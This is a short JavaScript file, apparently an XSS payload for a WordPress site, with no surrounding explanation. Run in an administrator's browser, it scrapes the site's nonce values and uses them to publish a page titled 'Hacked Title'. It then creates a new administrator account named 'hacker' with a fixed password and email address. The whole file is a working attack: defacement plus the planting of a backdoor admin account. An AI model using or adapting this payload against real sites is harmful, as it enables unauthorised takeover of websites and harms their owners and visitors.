var req = new XMLHttpRequest();

// To get "nonce code"
// That is a "number used once" to help protect URLs and forms from certain types of misuse, malicious or otherwise
req.open("GET", "/v3/wp-admin/post-new.php", false);
req.send();

var regex1 = /var wpApiSettings = (.*)/g;
var regex2 = /"nonce":"([^"]*?)"/g;
var nonce = regex1.exec(req.responseText)[1];
var nonce = regex2.exec(nonce)[1];

// Create page
var url = "/v3/wp-json/wp/v2/pages";
req.open("POST", url, true);
req.setRequestHeader('X-WP-Nonce', nonce)
req.setRequestHeader("Content-Type", "application/json");
req.send("{\"status\":\"publish\",\"title\":\"Hacked Title\",\"content\":\"Hacked Content\"}");



var wp_root = "" // don't add a trailing slash
var req_admin = new XMLHttpRequest();
var url = wp_root + "/v3/wp-admin/user-new.php";
var regex = /ser" value="([^"]*?)"/g;
req_admin.open("GET", url, false);
req_admin.send();
var nonce = regex.exec(req_admin.responseText);
var nonce = nonce[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=ccclinghhhh@gmail.com&pass1=AttackerP455&pass2=AttackerP455&role=administrator";
req_admin.open("POST", url, true);
req_admin.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req_admin.send(params);